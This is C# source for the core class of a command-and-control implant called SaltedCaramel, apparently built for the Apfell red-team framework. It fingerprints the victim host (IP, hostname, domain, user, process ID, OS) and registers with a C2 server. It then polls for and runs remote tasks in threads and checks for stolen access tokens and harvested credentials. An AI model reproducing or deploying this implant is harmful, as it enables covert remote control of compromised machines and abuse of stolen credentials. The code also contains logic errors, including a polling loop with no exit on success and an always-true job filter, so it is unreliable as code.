using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using Apfell.Structs;
using Apfell.C2Profiles;
using SaltedCaramel.Tasks;

namespace SaltedCaramel
{

    internal struct Job
    {
        public int shortId;
        public string task;
        internal Thread thread;
    }

    /// <summary>
    /// This class contains all methods used by the CaramelImplant
    /// </summary>
    public class SCImplant
    {
        private const int MAX_RETRIES = 20;
        public string CallbackID;
        
        internal List<Job> JobList;
        public string Host;
        public string IP;
        public int PID;
        public int SleepInterval;
        public string UserName;
        public string UUID = "UUID";
        public string DomainName;
        public string OS;
        public string Architecture;
        private int RetryCount;

        public C2Profile Profile;


        // serverEndpoint really should be a C2Profile class instance.
        public SCImplant(C2Profile profileInstance, int sleepTime=5000)
        {
            Profile = profileInstance;
            IP = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            Host = Dns.GetHostName();
            DomainName = Environment.UserDomainName;
            PID = Process.GetCurrentProcess().Id;
            OS = Environment.OSVersion.VersionString;
            if (IntPtr.Size == 8)
                Architecture = "x64";
            else
                Architecture = "x86";
            SleepInterval = sleepTime;
            UserName = Environment.UserName;
            //Endpoint = serverEndpoint;
            JobList = new List<Job>();
            RetryCount = 0;
        }


        /// <summary>
        /// Post a response to the Apfell endpoint
        /// </summary>
        /// <param name="taskresp">The response to post to the endpoint</param>
        /// <returns>String with the Apfell server's reply</returns>
        //public string PostResponse(SCTaskResp taskresp)
        //{
        //    string endpoint = this.Endpoint + "responses/" + taskresp.id;
        //    try // Try block for HTTP requests
        //    {
        //        // Encrypt json to send to server
        //        string json = JsonConvert.SerializeObject(taskresp);
        //        string result = HTTP.Post(endpoint, json);
        //        Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
        //        if (result.Contains("success"))
        //            // If it was successful, return the result
        //            return result;
        //        else
        //        {
        //            // If we didn't get success, retry and increment counter
        //            while (RetryCount < 20)
        //            {
        //                Debug.WriteLine($"[!] PostResponse - ERROR: Unable to post task response for {taskresp.id}, retrying...");
        //                Thread.Sleep(this.Sleep);
        //                this.PostResponse(taskresp);
        //            }
        //            RetryCount++;
        //            throw (new Exception("[!] PostResponse - ERROR: Retries exceeded"));
        //        }
        //    }
        //    catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
        //    {
        //        return e.Message;
        //    }

        //}

        //public void SendComplete(string taskId)
        //{
        //    Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
        //    SCTaskResp completeResponse = new SCTaskResp(taskId, "{\"completed\": true}");
        //    this.PostResponse(completeResponse);
        //}

        //public void SendError(string taskId, string error)
        //{
        //    Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
        //    SCTaskResp errorResponse = new SCTaskResp(taskId, "{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}");
        //    this.PostResponse(errorResponse);
        //}

        /// <summary>
        /// Send initial implant callback, different from normal task response
        /// because we need to get the implant ID from Apfell server
        /// </summary>
        public bool InitializeImplant()
        {
            // If we didn't get success, retry and increment counter
            while (RetryCount < MAX_RETRIES)
            {
                try
                {
                    string callbackID = Profile.RegisterAgent(this);
                    CallbackID = callbackID;
                    RetryCount = 0;
                    return true;
                } catch (Exception ex)
                {
                    RetryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return false;
        }

        public void Start()
        {
            if (InitializeImplant())
            {
                int shortId = 1;
                while (true)
                {
                    SCTask task = CheckTasking();
                    if (task.command != "none")
                    {
                        task.shortId = shortId;
                        shortId++;

                        Thread t = new Thread(() => task.DispatchTask(this));
                        t.Start();

                        if (task.command != "jobs" || task.command != "jobkill") // We don't want to add our job tracking jobs.
                        {
                            Job j = new Job
                            {
                                shortId = task.shortId,
                                task = task.command,
                                thread = t
                            };

                            if (task.@params != "")
                                j.task += " " + task.@params;

                            JobList.Add(j);
                        }


                    }
                    Thread.Sleep(SleepInterval);
                }
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        public SCTask CheckTasking()
        {
            SCTask task = null;
            while (RetryCount < MAX_RETRIES)
            {
                try
                {
                    task = Profile.CheckTasking(this);

                } catch (Exception ex)
                {
                    RetryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            RetryCount = 0;
            return task;
        }

        /// <summary>
        /// Check if the implant has an alternate token
        /// </summary>
        /// <returns>True if the implant has an alternate token, false if not</returns>
        public bool HasAlternateToken()
        {
            if (Tasks.Token.stolenHandle != IntPtr.Zero)
                return true;
            else return false;
        }

        public bool HasCredentials()
        {
            if (Tasks.Token.Cred.User != null)
                return true;
            else return false;
        }
    }
}
